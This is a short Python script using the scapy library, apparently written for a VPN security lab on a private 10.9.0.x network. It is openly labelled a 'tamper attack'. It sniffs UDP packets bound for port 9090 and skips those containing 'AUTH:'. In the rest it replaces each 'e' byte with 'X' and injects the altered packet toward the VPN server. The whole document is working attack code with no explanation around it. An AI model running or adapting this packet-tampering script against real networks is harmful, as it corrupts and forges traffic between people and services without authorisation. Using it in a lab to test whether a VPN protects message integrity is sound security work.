#!/usr/bin/env python3

from scapy.all import *

VPN_PORT = 9090
TARGET_IP = "10.9.0.11"  # VPN server IP

def tamper_packet(pkt):
    if UDP in pkt and pkt[UDP].dport == VPN_PORT:
        try:
            raw = bytes(pkt[UDP].payload)
            if b'AUTH:' in raw:
                return  # skip auth packets

            # Tamper with the data
            print(raw)
            tampered = raw.replace(b'e', b'X')
            print(tampered)

            # Send tampered version to the server
            send(IP(dst=pkt[IP].dst)/UDP(dport=VPN_PORT)/tampered, verbose=0)
            print("✏️ Tampered and sent packet")
        except Exception as e:
            print(f"❌ Error tampering packet: {e}")

print("🚨 Tamper attack running...")
sniff(filter=f"udp and dst port {VPN_PORT}", prn=tamper_packet, store=0)
